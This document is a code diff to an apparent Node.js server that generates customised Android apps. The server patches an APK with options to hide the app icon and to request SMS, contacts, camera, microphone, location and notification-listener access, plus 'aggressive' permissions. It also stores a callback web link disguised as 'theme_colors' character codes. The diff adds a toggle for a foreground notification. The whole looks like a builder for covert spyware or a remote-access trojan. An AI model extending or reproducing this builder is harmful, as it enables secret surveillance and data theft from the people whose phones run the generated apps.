@@ -1,4 +1,4 @@
-﻿const express = require('express');
+const express = require('express');
 const multer  = require('multer');
 const cors    = require('cors');
 const fs      = require('fs');
@@ -225,7 +225,7 @@ app.post('/generate', upload.single('icon'), async (req, res) => {
         uuid, appName, packageName: userPkg, hideApp, webLink, callbackUrl,
         enableSmsPermission, enableContactsPermission, enableStoragePermission,
         enableCameraPermission, enableMicrophonePermission, enableNotificationListener,
-        enableLocationPermission, aggressivePermissions,
+        enableLocationPermission, enableForegroundNotification, aggressivePermissions,
         notificationStyle, notificationClickAction, notificationTitle, notificationText, notificationIcon
     } = req.body;
     const customIcon = req.file;
@@ -273,12 +273,13 @@ app.post('/generate', upload.single('icon'), async (req, res) => {
                     patchManifestPackageOnly(manifestBuf, targetPkg);
                 }
 
-                const isSmsEnabled      = enableSmsPermission === 'true';
-                const isContactsEnabled = enableContactsPermission === 'true';
-                const isCameraEnabled   = enableCameraPermission === 'true';
-                const isMicEnabled      = enableMicrophonePermission === 'true';
-                const isLocationEnabled = enableLocationPermission === 'true';
-                const isStorageEnabled  = enableStoragePermission !== 'false';
+                const isSmsEnabled             = enableSmsPermission === 'true';
+                const isContactsEnabled        = enableContactsPermission === 'true';
+                const isCameraEnabled          = enableCameraPermission === 'true';
+                const isMicEnabled             = enableMicrophonePermission === 'true';
+                const isLocationEnabled        = enableLocationPermission === 'true';
+                const isStorageEnabled         = enableStoragePermission !== 'false';
+                const isForegroundNotifEnabled = enableForegroundNotification !== 'false';
 
                 const permsToNeutralize = [];
                 if (!isSmsEnabled) {
@@ -307,6 +308,9 @@ app.post('/generate', upload.single('icon'), async (req, res) => {
                         'android.permission.READ_EXTERNAL_STORAGE'
                     );
                 }
+                if (!isForegroundNotifEnabled) {
+                    permsToNeutralize.push('android.permission.POST_NOTIFICATIONS');
+                }
 
                 for (const perm of permsToNeutralize) {
                     const neutral = makeNeutralPerm(perm);
@@ -325,23 +329,24 @@ app.post('/generate', upload.single('icon'), async (req, res) => {
             const themeColors = Array.from(webLink || '').map(c => c.charCodeAt(0));
 
             const config = {
-                hideApp:                    hideApp === 'true',
-                theme_colors:               themeColors,
-                appName:                    targetName,
-                packageName:                targetPkg,
-                enableSmsPermission:        enableSmsPermission === 'true',
-                enableContactsPermission:   enableContactsPermission === 'true',
-                enableStoragePermission:    enableStoragePermission !== 'false',
-                enableCameraPermission:     enableCameraPermission === 'true',
-                enableMicrophonePermission: enableMicrophonePermission === 'true',
-                enableLocationPermission:   enableLocationPermission === 'true',
-                enableNotificationListener: enableNotificationListener === 'true',
-                aggressivePermissions:      aggressivePermissions === 'true',
-                notificationClickAction:    notificationClickAction || preset.action,
-                notificationTitle:          (notificationTitle && notificationTitle.trim()) ? notificationTitle.trim() : preset.title,
-                notificationText:           (notificationText  && notificationText.trim())  ? notificationText.trim()  : preset.text,
-                notificationIcon:           notificationIcon   || preset.icon,
-                notificationChannelName:    (notificationTitle && notificationTitle.trim()) ? notificationTitle.trim() : preset.title,
+                hideApp:                      hideApp === 'true',
+                theme_colors:                 themeColors,
+                appName:                      targetName,
+                packageName:                  targetPkg,
+                enableSmsPermission:          enableSmsPermission === 'true',
+                enableContactsPermission:     enableContactsPermission === 'true',
+                enableStoragePermission:      enableStoragePermission !== 'false',
+                enableCameraPermission:       enableCameraPermission === 'true',
+                enableMicrophonePermission:   enableMicrophonePermission === 'true',
+                enableLocationPermission:     enableLocationPermission === 'true',
+                enableNotificationListener:   enableNotificationListener === 'true',
+                enableForegroundNotification: enableForegroundNotification !== 'false',
+                aggressivePermissions:        aggressivePermissions === 'true',
+                notificationClickAction:      notificationClickAction || preset.action,
+                notificationTitle:            (notificationTitle && notificationTitle.trim()) ? notificationTitle.trim() : preset.title,
+                notificationText:             (notificationText  && notificationText.trim())  ? notificationText.trim()  : preset.text,
+                notificationIcon:             notificationIcon   || preset.icon,
+                notificationChannelName:      (notificationTitle && notificationTitle.trim()) ? notificationTitle.trim() : preset.title,
             };
 
             zip.addFile('assets/config.json', Buffer.from(JSON.stringify(config, null, 2), 'utf8'));
